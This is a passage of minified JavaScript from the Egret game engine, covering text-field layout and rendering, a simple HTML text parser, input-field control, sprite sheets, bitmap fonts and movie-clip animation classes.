        a.prototype._setLineSpacing = function (a) {
            this._lineSpacing != a && (this._setTextDirty(), this._lineSpacing = a)
        };
        a.prototype._getLineHeight = function () {
            return this._lineSpacing + this._size
        };
        Object.defineProperty(a.prototype, "numLines", {
            get: function () {
                return this._numLines
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "multiline", {
            get: function () {
                return this._multiline
            }, set: function (a) {
                this._setMultiline(a)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setMultiline = function (a) {
            this._multiline = a;
            this._setDirty()
        };
        a.prototype.setFocus = function () {
            c.Logger.warningWithErrorId(1013)
        };
        a.prototype._onRemoveFromStage = function () {
            b.prototype._onRemoveFromStage.call(this);
            this._type ==
            c.TextFieldType.INPUT && this._inputUtils._removeStageText()
        };
        a.prototype._onAddToStage = function () {
            b.prototype._onAddToStage.call(this);
            this._type == c.TextFieldType.INPUT && this._inputUtils._addStageText()
        };
        a.prototype._updateBaseTransform = function () {
            b.prototype._updateTransform.call(this)
        };
        a.prototype._updateTransform = function () {
            this._type == c.TextFieldType.INPUT ? this._normalDirty ? this._inputUtils._updateProperties() : this._inputUtils._updateTransform() : this._updateBaseTransform()
        };
        a.prototype._render =
            function (a) {
                this.drawText(a);
                this._clearDirty()
            };
        a.prototype._measureBounds = function () {
            return this._getLinesArr() ? c.Rectangle.identity.initialize(0, 0, this._textMaxWidth, this._textMaxHeight + (this._numLines - 1) * this._lineSpacing) : c.Rectangle.identity.initialize(0, 0, 0, 0)
        };
        Object.defineProperty(a.prototype, "textFlow", {
            get: function () {
                return this._textArr
            }, set: function (a) {
                this._isFlow = !0;
                var b = "";
                null == a && (a = []);
                for (var c = 0; c < a.length; c++)b += a[c].text;
                this._displayAsPassword ? this._setBaseText(b) : (this._text =
                    b, this.setMiddleStyle(a))
            }, enumerable: !0, configurable: !0
        });
        a.prototype.changeToPassText = function (a) {
            if (this._displayAsPassword) {
                for (var b = "", c = 0, d = a.length; c < d; c++)switch (a.charAt(c)) {
                    case "\n":
                        b += "\n";
                        break;
                    case "\r":
                        break;
                    default:
                        b += "*"
                }
                return b
            }
            return a
        };
        a.prototype.setMiddleStyle = function (a) {
            this._isArrayChanged = !0;
            this._textArr = a;
            this._setSizeDirty()
        };
        Object.defineProperty(a.prototype, "textWidth", {
            get: function () {
                return this._textMaxWidth
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype,
            "textHeight", {
                get: function () {
                    return this._textMaxHeight
                }, enumerable: !0, configurable: !0
            });
        a.prototype.appendText = function (a) {
            this.appendElement({text: a})
        };
        a.prototype.appendElement = function (a) {
            this._textArr.push(a);
            this.setMiddleStyle(this._textArr)
        };
        a.prototype._getLinesArr = function () {
            if (!this._isArrayChanged)return this._linesArr;
            this._isArrayChanged = !1;
            var a = this._textArr, b = c.MainContext.instance.rendererContext;
            this._linesArr = [];
            this._textMaxWidth = this._textMaxHeight = 0;
            if (this._hasWidthSet && 0 ==
                this._explicitWidth)return this._numLines = 0, [{width: 0, height: 0, elements: []}];
            var d = this._linesArr, h = 0, f = 0, g = 0, k;
            this._isFlow || b.setupFont(this);
            for (var l = 0; l < a.length; l++) {
                var m = a[l];
                m.style = m.style || {};
                for (var p = m.text.toString().split(/(?:\r\n|\r|\n)/), r = 0; r < p.length; r++) {
                    null == d[g] && (k = {width: 0, height: 0, elements: []}, d[g] = k, f = h = 0);
                    f = this._type == c.TextFieldType.INPUT ? this._size : Math.max(f, m.style.size || this._size);
                    if ("" != p[r]) {
                        this._isFlow && b.setupFont(this, m.style);
                        var t = b.measureText(p[r]);
                        if (this._hasWidthSet)if (h +
                            t <= this._explicitWidth)k.elements.push({
                            width: t,
                            text: p[r],
                            style: m.style
                        }), h += t; else {
                            for (var s = 0, u = 0, w = p[r], v = w.length; s < v; s++) {
                                t = b.measureText(w.charAt(s));
                                if (h + t > this._explicitWidth && 0 != h + s)break;
                                u += t;
                                h += t
                            }
                            0 < s && (k.elements.push({
                                width: u,
                                text: w.substring(0, s),
                                style: m.style
                            }), p[r] = w.substring(s));
                            r--
                        } else h += t, k.elements.push({width: t, text: p[r], style: m.style})
                    }
                    if (r < p.length - 1) {
                        k.width = h;
                        k.height = f;
                        this._textMaxWidth = Math.max(this._textMaxWidth, h);
                        this._textMaxHeight += f;
                        if (this._type == c.TextFieldType.INPUT && !this._multiline)return this._numLines = d.length, d;
                        g++
                    }
                }
                l == a.length - 1 && k && (k.width = h, k.height = f, this._textMaxWidth = Math.max(this._textMaxWidth, h), this._textMaxHeight += f)
            }
            this._numLines = d.length;
            return d
        };
        a.prototype.drawText = function (a) {
            var b = this._getLinesArr();
            if (b) {
                this._isFlow || a.setupFont(this);
                var d = this._hasWidthSet ? this._explicitWidth : this._textMaxWidth, h = this._textMaxHeight + (this._numLines - 1) * this._lineSpacing, f = 0, g = 0;
                if (this._hasHeightSet)if (h < this._explicitHeight) {
                    var k = 0;
                    this._verticalAlign ==
                    c.VerticalAlign.MIDDLE ? k = 0.5 : this._verticalAlign == c.VerticalAlign.BOTTOM && (k = 1);
                    f += k * (this._explicitHeight - h)
                } else h > this._explicitHeight && (g = Math.max(this._scrollV - 1, 0), g = Math.min(this._numLines - 1, g));
                f = Math.round(f);
                h = 0;
                this._textAlign == c.HorizontalAlign.CENTER ? h = 0.5 : this._textAlign == c.HorizontalAlign.RIGHT && (h = 1);
                for (k = 0; g < this._numLines; g++) {
                    var l = b[g], m = l.height, f = f + m / 2;
                    if (0 != g && this._hasHeightSet && f > this._explicitHeight)break;
                    for (var k = Math.round((d - l.width) * h), p = 0; p < l.elements.length; p++) {
                        var r =
                            l.elements[p], t = r.style.size || this._size;
                        this._type == c.TextFieldType.INPUT ? a.drawText(this, r.text, k, f + (m - t) / 2, r.width) : (this._isFlow && a.setupFont(this, r.style), a.drawText(this, r.text, k, f + (m - t) / 2, r.width, r.style));
                        k += r.width
                    }
                    f += m / 2 + this._lineSpacing
                }
            }
        };
        a.default_fontFamily = "Arial";
        return a
    }(c.DisplayObject);
    c.TextField = d;
    d.prototype.__class__ = "egret.TextField"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
            this.resutlArr = []
        }

        b.prototype.parser = function (a) {
            this.stackArray = [];
            this.resutlArr = [];
            for (var e = 0, b = a.length; e < b;) {
                var c = a.indexOf("<", e);
                0 > c ? (this.addToResultArr(a.substring(e)), e = b) : (this.addToResultArr(a.substring(e, c)), e = a.indexOf(">", c), "/" == a.charAt(c + 1) ? this.stackArray.pop() : this.addToArray(a.substring(c + 1, e)), e += 1)
            }
            return this.resutlArr
        };
        b.prototype.addToResultArr = function (a) {
            if ("" != a) {
                var e = [];
                e.push(["&lt;", "<"]);
                e.push(["&gt;", ">"]);
                e.push(["&amp;",
                    "&"]);
                e.push(["&quot;", '"']);
                e.push(["&apos;;", "'"]);
                for (var b = 0; b < e.length; b++)a.replace(new RegExp(e[b][0], "g"), e[b][1]);
                0 < this.stackArray.length ? this.resutlArr.push({
                    text: a,
                    style: this.stackArray[this.stackArray.length - 1]
                }) : this.resutlArr.push({text: a})
            }
        };
        b.prototype.changeStringToObject = function (a) {
            var e = {};
            a = a.replace(/( )+/g, " ").split(" ");
            for (var b = 0; b < a.length; b++)this.addProperty(e, a[b]);
            return e
        };
        b.prototype.addProperty = function (a, e) {
            var b = e.replace(/( )*=( )*/g, "=").split("=");
            b[1] && (b[1] =
                b[1].replace(/(\"|\')/g, ""));
            switch (b[0].toLowerCase()) {
                case "color":
                    a.textColor = parseInt(b[1]);
                    break;
                case "b":
                    a.bold = "true" == (b[1] || "true");
                    break;
                case "i":
                    a.italic = "true" == (b[1] || "true");
                    break;
                case "size":
                    a.size = parseInt(b[1]);
                    break;
                case "fontFamily":
                    a.fontFamily = b[1]
            }
        };
        b.prototype.addToArray = function (a) {
            a = this.changeStringToObject(a);
            if (0 != this.stackArray.length) {
                var b = this.stackArray[this.stackArray.length - 1], c;
                for (c in b)null == a[c] && (a[c] = b[c])
            }
            this.stackArray.push(a)
        };
        return b
    }();
    c.HtmlTextParser =
        d;
    d.prototype.__class__ = "egret.HtmlTextParser"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
        }

        b.DYNAMIC = "dynamic";
        b.INPUT = "input";
        return b
    }();
    c.TextFieldType = d;
    d.prototype.__class__ = "egret.TextFieldType"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(a) {
            b.call(this);
            this.bitmapData = this._bitmapY = this._bitmapX = this._sourceHeight = this._sourceWidth = 0;
            this._textureMap = {};
            var c = a.bitmapData;
            this.bitmapData = c;
            this._sourceWidth = c.width;
            this._sourceHeight = c.height;
            this._bitmapX = a._bitmapX - a._offsetX;
            this._bitmapY = a._bitmapY - a._offsetY
        }

        __extends(a, b);
        a.prototype.getTexture = function (a) {
            return this._textureMap[a]
        };
        a.prototype.createTexture = function (a, b, d, h, f, g, k, l, m) {
            void 0 === g && (g = 0);
            void 0 === k && (k = 0);
            "undefined" === typeof l && (l = g + h);
            "undefined" === typeof m && (m = k + f);
            var p = new c.Texture, r = c.MainContext.instance.rendererContext._texture_scale_factor;
            p._bitmapData = this.bitmapData;
            p._bitmapX = this._bitmapX + b;
            p._bitmapY = this._bitmapY + d;
            p._bitmapWidth = h * r;
            p._bitmapHeight = f * r;
            p._offsetX = g;
            p._offsetY = k;
            p._textureWidth = l * r;
            p._textureHeight = m * r;
            p._sourceWidth = this._sourceWidth;
            p._sourceHeight = this._sourceHeight;
            return this._textureMap[a] = p
        };
        return a
    }(c.HashObject);
    c.SpriteSheet = d;
    d.prototype.__class__ = "egret.SpriteSheet"
})(egret ||
(egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._isFocus = !1;
            this._text = null;
            this._isFirst = this._isFirst = !0
        }

        __extends(a, b);
        a.prototype.init = function (a) {
            this._text = a;
            this.stageText = c.StageText.create();
            a = this._text.localToGlobal();
            this.stageText._open(a.x, a.y, this._text._explicitWidth, this._text._explicitHeight)
        };
        a.prototype._addStageText = function () {
            this._text._inputEnabled || (this._text._touchEnabled = !0);
            this.stageText._add();
            this.stageText._addListeners();
            this.stageText.addEventListener("blur",
                this.onBlurHandler, this);
            this.stageText.addEventListener("focus", this.onFocusHandler, this);
            this.stageText.addEventListener("updateText", this.updateTextHandler, this);
            this._text.addEventListener(c.TouchEvent.TOUCH_TAP, this.onMouseDownHandler, this);
            c.MainContext.instance.stage.addEventListener(c.TouchEvent.TOUCH_TAP, this.onStageDownHandler, this);
            c.MainContext.instance.stage.addEventListener(c.Event.RESIZE, this.onResize, this)
        };
        a.prototype._removeStageText = function () {
            this.stageText._remove();
            this.stageText._removeListeners();
            this._text._inputEnabled || (this._text._touchEnabled = !1);
            this.stageText.removeEventListener("blur", this.onBlurHandler, this);
            this.stageText.removeEventListener("focus", this.onFocusHandler, this);
            this.stageText.removeEventListener("updateText", this.updateTextHandler, this);
            this._text.removeEventListener(c.TouchEvent.TOUCH_TAP, this.onMouseDownHandler, this);
            c.MainContext.instance.stage.removeEventListener(c.TouchEvent.TOUCH_TAP, this.onStageDownHandler, this);
            c.MainContext.instance.stage.removeEventListener(c.Event.RESIZE,
                this.onResize, this)
        };
        a.prototype.onResize = function () {
            this._isFirst = !0
        };
        a.prototype._getText = function () {
            return this.stageText._getText()
        };
        a.prototype._setText = function (a) {
            this.stageText._setText(a)
        };
        a.prototype.onFocusHandler = function (a) {
            this.hideText()
        };
        a.prototype.onBlurHandler = function (a) {
            this.showText()
        };
        a.prototype.onMouseDownHandler = function (a) {
            a.stopPropagation();
            this._text._visible && this.stageText._show()
        };
        a.prototype.onStageDownHandler = function (a) {
            this.stageText._hide();
            this.showText()
        };
        a.prototype.showText =
            function () {
                this._isFocus && (this._isFocus = !1, this.resetText())
            };
        a.prototype.hideText = function () {
            this._isFocus || (this._text._setBaseText(""), this._isFocus = !0)
        };
        a.prototype.updateTextHandler = function (a) {
            this.resetText();
            this._text.dispatchEvent(new c.Event(c.Event.CHANGE))
        };
        a.prototype.resetText = function () {
            this._text._setBaseText(this.stageText._getText())
        };
        a.prototype._updateTransform = function () {
            var a = this._text._worldTransform.a, b = this._text._worldTransform.b, d = this._text._worldTransform.c, h = this._text._worldTransform.d,
                f = this._text._worldTransform.tx, g = this._text._worldTransform.ty;
            this._text._updateBaseTransform();
            var k = this._text._worldTransform;
            if (this._isFirst || a != k.a || b != k.b || d != k.c || h != k.d || f != k.tx || g != k.ty) {
                this._isFirst = !1;
                a = this._text.localToGlobal();
                this.stageText.changePosition(a.x, a.y);
                var l = this;
                c.callLater(function () {
                    l.stageText._setScale(l._text._worldTransform.a, l._text._worldTransform.d)
                }, this)
            }
        };
        a.prototype._updateProperties = function () {
            var a = this._text._stage;
            if (null == a)this.stageText._setVisible(!1);
            else {
                for (var b = this._text, d = b._visible; d;) {
                    b = b.parent;
                    if (b == a)break;
                    d = b._visible
                }
                this.stageText._setVisible(d)
            }
            this.stageText._setMultiline(this._text._multiline);
            this.stageText._setMaxChars(this._text._maxChars);
            this.stageText._setSize(this._text._size);
            this.stageText._setTextColor(this._text._textColorString);
            this.stageText._setTextFontFamily(this._text._fontFamily);
            this.stageText._setBold(this._text._bold);
            this.stageText._setItalic(this._text._italic);
            this.stageText._setTextAlign(this._text._textAlign);
            this.stageText._setWidth(this._text._getSize(c.Rectangle.identity).width);
            this.stageText._setHeight(this._text._getSize(c.Rectangle.identity).height);
            this.stageText._setTextType(this._text._displayAsPassword ? "password" : "text");
            this.stageText._setText(this._text._text);
            this.stageText._resetStageText();
            this._updateTransform()
        };
        return a
    }(c.HashObject);
    c.InputController = d;
    d.prototype.__class__ = "egret.InputController"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(a, c) {
            b.call(this, a);
            this.firstCharHeight = 0;
            "string" == typeof c ? this.charList = this.parseConfig(c) : c && c.hasOwnProperty("frames") ? this.charList = c.frames : this.charList = {}
        }

        __extends(a, b);
        a.prototype.getTexture = function (a) {
            var b = this._textureMap[a];
            if (!b) {
                b = this.charList[a];
                if (!b)return null;
                b = this.createTexture(a, b.x, b.y, b.w, b.h, b.offX, b.offY, b.sourceW, b.sourceH);
                this._textureMap[a] = b
            }
            return b
        };
        a.prototype._getFirstCharHeight = function () {
            if (0 == this.firstCharHeight)for (var a in this.charList) {
                var b =
                    this.charList[a];
                if (b) {
                    var c = b.sourceH;
                    void 0 === c && (c = b.h, void 0 === c && (c = 0), b = b.offY, void 0 === b && (b = 0), c += b);
                    if (!(0 >= c)) {
                        this.firstCharHeight = c;
                        break
                    }
                }
            }
            return this.firstCharHeight
        };
        a.prototype.parseConfig = function (a) {
            a = a.split("\r\n").join("\n");
            a = a.split("\n");
            for (var b = this.getConfigByKey(a[3], "count"), c = {}, d = 4; d < 4 + b; d++) {
                var f = a[d], g = String.fromCharCode(this.getConfigByKey(f, "id")), k = {};
                c[g] = k;
                k.x = this.getConfigByKey(f, "x");
                k.y = this.getConfigByKey(f, "y");
                k.w = this.getConfigByKey(f, "width");
                k.h =
                    this.getConfigByKey(f, "height");
                k.offX = this.getConfigByKey(f, "xoffset");
                k.offY = this.getConfigByKey(f, "yoffset")
            }
            return c
        };
        a.prototype.getConfigByKey = function (a, b) {
            for (var c = a.split(" "), d = 0, f = c.length; d < f; d++) {
                var g = c[d];
                if (b == g.substring(0, b.length))return c = g.substring(b.length + 1), parseInt(c)
            }
            return 0
        };
        return a
    }(c.SpriteSheet);
    c.BitmapFont = d;
    d.prototype.__class__ = "egret.BitmapFont"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(a, d) {
            b.call(this, a, d);
            c.Logger.warningWithErrorId(1012)
        }

        __extends(a, b);
        return a
    }(c.BitmapFont);
    c.BitmapTextSpriteSheet = d;
    d.prototype.__class__ = "egret.BitmapTextSpriteSheet"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(a) {
            b.call(this);
            this._isAddedToStage = !1;
            this._frames = this._movieClipData = this._textureToRender = null;
            this._totalFrames = 0;
            this._frameLabels = null;
            this._frameIntervalTime = 0;
            this._eventPool = null;
            this._isPlaying = !1;
            this._isStopped = !0;
            this._passedTime = this._displayedKeyFrameNum = this._nextFrameNum = this._currentFrameNum = this._playTimes = 0;
            this._setMovieClipData(a);
            this.needDraw = !0
        }

        __extends(a, b);
        a.prototype._init = function () {
            this._reset();
            var a = this._movieClipData;
            a &&
            a._isDataValid() && (this._frames = a.frames, this._totalFrames = a.numFrames, this._frameLabels = a.labels, this._frameIntervalTime = 1E3 / a.frameRate, this._initFrame())
        };
        a.prototype._reset = function () {
            this._frames = null;
            this._playTimes = 0;
            this._isPlaying = !1;
            this.setIsStopped(!0);
            this._currentFrameNum = 0;
            this._nextFrameNum = 1;
            this._passedTime = this._displayedKeyFrameNum = 0;
            this._eventPool = []
        };
        a.prototype._initFrame = function () {
            this._movieClipData._isTextureValid() && (this._advanceFrame(), this._constructFrame())
        };
        a.prototype._render =
            function (b) {
                var c = this._textureToRender;
                if (this._texture_to_render = c) {
                    var d = Math.round(c._offsetX), h = Math.round(c._offsetY), f = c._bitmapWidth || c._textureWidth, g = c._bitmapHeight || c._textureHeight, k = Math.round(f), l = Math.round(g);
                    a.renderFilter.drawImage(b, this, c._bitmapX, c._bitmapY, f, g, d, h, k, l)
                }
            };
        a.prototype._measureBounds = function () {
            var a = this._textureToRender;
            return a ? c.Rectangle.identity.initialize(a._offsetX, a._offsetY, a._textureWidth, a._textureHeight) : b.prototype._measureBounds.call(this)
        };
        a.prototype._onAddToStage =
            function () {
                b.prototype._onAddToStage.call(this);
                this._isAddedToStage = !0;
                this._isPlaying && 1 < this._totalFrames && this.setIsStopped(!1)
            };
        a.prototype._onRemoveFromStage = function () {
            b.prototype._onRemoveFromStage.call(this);
            this._isAddedToStage = !1;
            this.setIsStopped(!0)
        };
        a.prototype._getFrameLabelByName = function (a, b) {
            void 0 === b && (b = !1);
            b && (a = a.toLowerCase());
            var c = this._frameLabels;
            if (c)for (var d = null, f = 0; f < c.length; f++)if (d = c[f], b ? d.name.toLowerCase() === a : d.name === a)return d;
            return null
        };
        a.prototype._getFrameLabelByFrame =
            function (a) {
                var b = this._frameLabels;
                if (b)for (var c = null, d = 0; d < b.length; d++)if (c = b[d], c.frame === a)return c;
                return null
            };
        a.prototype._getFrameLabelForFrame = function (a) {
            var b = null, c = null, d = this._frameLabels;
            if (d)for (var f = 0; f < d.length; f++) {
                c = d[f];
                if (c.frame > a)break;
                b = c
            }
            return b
        };
        a.prototype.play = function (a) {
            void 0 === a && (a = 0);
            this._isPlaying = !0;
            this.setPlayTimes(a);
            1 < this._totalFrames && this._isAddedToStage && this.setIsStopped(!1)
        };
        a.prototype.stop = function () {
            this._isPlaying = !1;
            this.setIsStopped(!0)
        };
        a.prototype.prevFrame =
            function () {
                this.gotoAndStop(this._currentFrameNum - 1)
            };
        a.prototype.nextFrame = function () {
            this.gotoAndStop(this._currentFrameNum + 1)
        };
        a.prototype.gotoAndPlay = function (a, b) {
            void 0 === b && (b = 0);
            if (0 === arguments.length || 2 < arguments.length)throw Error(c.getString(1022, "MovieClip.gotoAndPlay()"));
            this.play(b);
            this._gotoFrame(a)
        };
        a.prototype.gotoAndStop = function (a) {
            if (1 != arguments.length)throw Error(c.getString(1022, "MovieClip.gotoAndStop()"));
            this.stop();
            this._gotoFrame(a)
        };
        a.prototype._gotoFrame = function (a) {
            var b;
            if ("string" === typeof a)b = this._getFrameLabelByName(a).frame; else if (b = parseInt(a + "", 10), b != a)throw Error(c.getString(1022, "Frame Label Not Found"));
            1 > b ? b = 1 : b > this._totalFrames && (b = this._totalFrames);
            b !== this._nextFrameNum && (this._nextFrameNum = b, this._advanceFrame(), this._constructFrame(), this._handlePendingEvent())
        };
        a.prototype._advanceTime = function (a) {
            var b = this._frameIntervalTime;
            a = this._passedTime + a;
            this._passedTime = a % b;
            b = a / b;
            if (!(1 > b)) {
                for (; 1 <= b;) {
                    b--;
                    this._nextFrameNum++;
                    if (this._nextFrameNum >
                        this._totalFrames)if (-1 == this._playTimes)this._eventPool.push(c.Event.LOOP_COMPLETE), this._nextFrameNum = 1; else if (this._playTimes--, 0 < this._playTimes)this._eventPool.push(c.Event.LOOP_COMPLETE), this._nextFrameNum = 1; else {
                        this._nextFrameNum = this._totalFrames;
                        this._eventPool.push(c.Event.COMPLETE);
                        this.stop();
                        break
                    }
                    this._advanceFrame()
                }
                this._constructFrame();
                this._handlePendingEvent()
            }
        };
        a.prototype._advanceFrame = function () {
            this._currentFrameNum = this._nextFrameNum
        };
        a.prototype._constructFrame = function () {
            var a =
                this._currentFrameNum;
            this._displayedKeyFrameNum != a && (this._textureToRender = this._movieClipData.getTextureByFrame(a), this._displayedKeyFrameNum = a)
        };
        a.prototype._handlePendingEvent = function () {
            if (0 != this._eventPool.length) {
                this._eventPool.reverse();
                for (var a = this._eventPool, b = a.length, d = !1, h = !1, f = 0; f < b; f++) {
                    var g = a.pop();
                    g == c.Event.LOOP_COMPLETE ? h = !0 : g == c.Event.COMPLETE ? d = !0 : this.dispatchEventWith(g)
                }
                h && this.dispatchEventWith(c.Event.LOOP_COMPLETE);
                d && this.dispatchEventWith(c.Event.COMPLETE)
            }
        };
        Object.defineProperty(a.prototype,
            "totalFrames", {
                get: function () {
                    return this._totalFrames
                }, enumerable: !0, configurable: !0
            });
        Object.defineProperty(a.prototype, "currentFrame", {
            get: function () {
                return this._currentFrameNum
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "currentFrameLabel", {
            get: function () {
                var a = this._getFrameLabelByFrame(this._currentFrameNum);
                return a && a.name
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "currentLabel", {
            get: function () {
                var a = this._getFrameLabelForFrame(this._currentFrameNum);
                return a ? a.name : null
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "frameRate", {
            get: function () {
                return this.movieClipData.frameRate
            }, set: function (a) {
                a != this._movieClipData.frameRate && (this._movieClipData.frameRate = a, this._frameIntervalTime = 1E3 / this._movieClipData.frameRate)
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "isPlaying", {
            get: function () {
                return this._isPlaying
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "movieClipData", {
            get: function () {
                return this._movieClipData
            },
            set: function (a) {
                this._setMovieClipData(a)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setMovieClipData = function (a) {
            this._movieClipData != a && (this._movieClipData = a, this._init())
        };
        a.prototype.setPlayTimes = function (a) {
            if (0 > a || 1 <= a)this._playTimes = 0 > a ? -1 : Math.floor(a)
        };
        a.prototype.setIsStopped = function (a) {
            this._isStopped != a && ((this._isStopped = a) ? (this._playTimes = 0, c.Ticker.getInstance().unregister(this._advanceTime, this)) : (this._playTimes = 0 == this._playTimes ? 1 : this._playTimes, c.Ticker.getInstance().register(this._advanceTime,
                this)))
        };
        a.renderFilter = c.RenderFilter.getInstance();
        return a
    }(c.DisplayObject);
    c.MovieClip = d;
    d.prototype.__class__ = "egret.MovieClip"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(a, c) {
            b.call(this);
            this._name = a;
            this._frame = c | 0
        }

        __extends(a, b);
        Object.defineProperty(a.prototype, "name", {
            get: function () {
                return this._name
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "frame", {
            get: function () {
                return this._frame
            }, enumerable: !0, configurable: !0
        });
        a.prototype.clone = function () {
            return new a(this._name, this._frame)
        };
        return a
    }(c.EventDispatcher);
    c.FrameLabel = d;
    d.prototype.__class__ = "egret.FrameLabel"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._mcData = null;
            this.numFrames = 1;
            this.frames = [];
            this.labels = null;
            this.frameRate = 0;
            this.spriteSheet = this.textureData = null
        }

        __extends(a, b);
        a.prototype._init = function (a, b, c) {
            this.textureData = b;
            this.spriteSheet = c;
            this._setMCData(a)
        };
        a.prototype.getKeyFrameData = function (a) {
            a = this.frames[a - 1];
            a.frame && (a = this.frames[a.frame - 1]);
            return a
        };
        a.prototype.getTextureByFrame = function (a) {
            a = this.getKeyFrameData(a);
            if (a.res) {
                var b = this.getTextureByResName(a.res);
                b._offsetX = a.x | 0;
                b._offsetY = a.y | 0;
                return b
            }
            return null
        };
        a.prototype.getTextureByResName = function (a) {
            var b = this.spriteSheet.getTexture(a);
            b || (b = this.textureData[a], b = this.spriteSheet.createTexture(a, b.x, b.y, b.w, b.h));
            return b
        };
        a.prototype._isDataValid = function () {
            return 0 < this.frames.length
        };
        a.prototype._isTextureValid = function () {
            return null != this.textureData && null != this.spriteSheet
        };
        a.prototype._fillMCData = function (a) {
            this.frameRate = a.frameRate || 24;
            this._fillFramesData(a.frames);
            this._fillFrameLabelsData(a.labels)
        };
        a.prototype._fillFramesData = function (a) {
            for (var b = this.frames, c = a ? a.length : 0, d, f = 0; f < c; f++)if (d = a[f], b.push(d), d.duration) {
                var g = parseInt(d.duration);
                if (1 < g) {
                    d = b.length;
                    for (var k = 1; k < g; k++)b.push({frame: d})
                }
            }
            this.numFrames = b.length
        };
        a.prototype._fillFrameLabelsData = function (a) {
            if (a) {
                var b = a.length;
                if (0 < b) {
                    this.labels = [];
                    for (var d = 0; d < b; d++) {
                        var h = a[d];
                        this.labels.push(new c.FrameLabel(h.name, h.frame))
                    }
                }
            }
        };
        Object.defineProperty(a.prototype, "mcData", {
            get: function () {
                return this._mcData
            }, set: function (a) {
                this._setMCData(a)
            },
            enumerable: !0, configurable: !0
        });
        a.prototype._setMCData = function (a) {
            this._mcData != a && (this._mcData = a) && this._fillMCData(a)
        };
        return a
    }(c.HashObject);
    c.MovieClipData = d;
    d.prototype.__class__ = "egret.MovieClipData"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(a, c) {
            b.call(this);
            this.enableCache = !0;
            this._mcDataCache = {};
            this._mcDataSet = a;
            this.setTexture(c)
        }

        __extends(a, b);
        a.prototype.clearCache = function () {
            this._mcDataCache = {}
        };
        a.prototype.generateMovieClipData = function (a) {
            void 0 === a && (a = "");
            if ("" == a && this._mcDataSet)for (a in this._mcDataSet.mc)break;
            if ("" == a)return null;
            var b = this._findFromCache(a, this._mcDataCache);
            b || (b = new c.MovieClipData, this._fillData(a, b, this._mcDataCache));
            return b
        };
        a.prototype._findFromCache =
            function (a, b) {
                return this.enableCache && b[a] ? b[a] : null
            };
        a.prototype._fillData = function (a, b, c) {
            if (this._mcDataSet) {
                var d = this._mcDataSet.mc[a];
                d && (b._init(d, this._mcDataSet.res, this._spriteSheet), this.enableCache && (c[a] = b))
            }
        };
        Object.defineProperty(a.prototype, "mcDataSet", {
            get: function () {
                return this._mcDataSet
            }, set: function (a) {
                this._mcDataSet = a
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "texture", {
            set: function (a) {
                this.setTexture(a)
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype,
            "spriteSheet", {
                get: function () {
                    return this._spriteSheet
                }, enumerable: !0, configurable: !0
            });
        a.prototype.setTexture = function (a) {
            this._spriteSheet = a ? new c.SpriteSheet(a) : null
        };
        return a
    }(c.EventDispatcher);
    c.MovieClipDataFactory = d;
    d.prototype.__class__ = "egret.MovieClipDataFactory"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._scaleY = this._scaleX = 1;
            this._size = 30;
            this._color = "#FFFFFF";
            this._fontFamily = "Arial";
            this._italic = this._bold = !1;
            this._textAlign = "left";
            this._multiline = this._visible = !1;
            this._maxChars = 0
        }

        __extends(a, b);
        a.prototype._getText = function () {
            return null
        };
        a.prototype._setText = function (a) {
        };
        a.prototype._setTextType = function (a) {
        };
        a.prototype._getTextType = function () {
            return null
        };
        a.prototype._open = function (a, b, c, d) {
        };
        a.prototype._show = function () {
        };
        a.prototype._add =
            function () {
            };
